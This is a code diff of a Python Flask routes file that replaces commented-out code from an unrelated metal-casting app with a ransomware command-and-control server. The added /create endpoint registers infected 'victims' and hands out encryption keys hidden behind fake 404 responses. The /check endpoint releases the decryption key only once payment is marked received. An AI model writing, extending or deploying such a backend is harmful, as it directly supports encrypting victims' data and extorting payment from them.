@@ -1,6 +1,8 @@
-from flask import render_template, url_for, flash, redirect, request
-from app import app
+from flask import render_template, url_for, flash, redirect, request, make_response
+from app import app, db
 from app.models import Victim, load_victim
+import random, os
+import base64
 
 # Show an overview of all victims currently registered in the database
 @app.route("/", methods=["GET"])
@@ -22,50 +24,41 @@ def displayArchive():
     return render_template("archive.html", title="Archiv", victims=victims)
 
 
-# @app.route("/create", methods=["POST"])
-# def displayForm():
-#     form = CastForm()
-#     if form.validate_on_submit():
-#         density = Alloy.query.filter_by(alloy_id=form.alloyId.data).first().density
-#         weightModel = float(form.weightModel.data.replace(",", "."))
-#         if not form.weightAdditional.data:
-#             weightAdditional = 8
-#         else:
-#             weightAdditional = float(form.weightAdditional.data.replace(",", "."))
-
-#         if form.material.data == "resin":
-#             weightMaterial = round((weightModel * density), 1)
-#         else:
-#             weightMaterial = round(((weightModel / 0.9) * density), 1)
-
-#         cast = Cast(
-#             cast_name=form.castName.data,
-#             cuvette_size=form.cuvetteSize.data,
-#             cuvette_nr=form.cuvetteNr.data,
-#             material=form.material.data,
-#             material_embedding=form.materialEmbedding.data,
-#             weight_model=weightModel,
-#             weight_material=weightMaterial,
-#             weight_total=weightMaterial + weightAdditional,
-#             alloy_id=form.alloyId.data,
-#         )
-#         db.session.add(cast)
-#         db.session.commit()
-#         flash(f"Neuer Guss erstellt mit Name '{form.castName.data}'", "success")
-#         return redirect(url_for("displayIndex"))
-#     for crucible in Crucible.query.all():
-#         if crucible.count >= 25:
-#             flash(
-#                 f"Achtung: Tiegel '{crucible.crucible_name}' hat schon {crucible.count} Verwendungen!",
-#                 "danger",
-#             )
-#     return render_template("create.html", title="Neu Erstellen", form=form)
+# When called, creates an Victim object in the DB and responds with a fake 404,
+# with HTTP headers containing Encryption ID & Key
+# ex: curl -i -X POST -F 'victim_name=RandomInfectedPC' -F 'ip=192.168.178.3' http://127.1:5000/create
+@app.route("/create", methods=["POST"])
+def createVictim():
+    error = None
+    if request.method == "POST":
+        # if request.accesskey == "accesskey":
+        victim_id = random.randint(0, 999999999999)
+        victim_key = base64.b64encode(os.urandom(16)).decode("ascii")
+        victim = Victim(
+            victim_id=victim_id,
+            victim_name=request.form["victim_name"],
+            victim_key=victim_key,
+            ip_firstContact=request.form["ip"],
+        )
+        db.session.add(victim)
+        db.session.commit()
+        response = make_response(render_template("404.html"), 404)
+        response.headers["Victim-Id"] = str(victim_id)
+        response.headers["Victim-Key"] = victim_key
+        return response
 
 
-# @app.route("/archive")
-# def displayArchive():
-#     casts = Cast.query.filter_by(archived=1).order_by(Cast.cast_id.desc()).all()
-#     return render_template("archive.html", title="Archiv", casts=casts)
+# Checks if payment has been received by the specific victim ID.
+# If so, return Decryption key to enable decryption on the client
+# ex: curl -i -X POST http://127.1:5000/check/36821736128
+@app.route("/check/<int:victim_id>", methods=["POST"])
+def checkStatus(victim_id):
+    victim = Victim.query.get(victim_id)
+    response = make_response(render_template("404.html"), 404)
+    response.headers["Payment-Received"] = str(victim.payment_received)
+    if victim.payment_received:
+        response.headers["Victim-Key"] = victim.victim_key
+    return response
 
 
 # @app.route("/alloys")
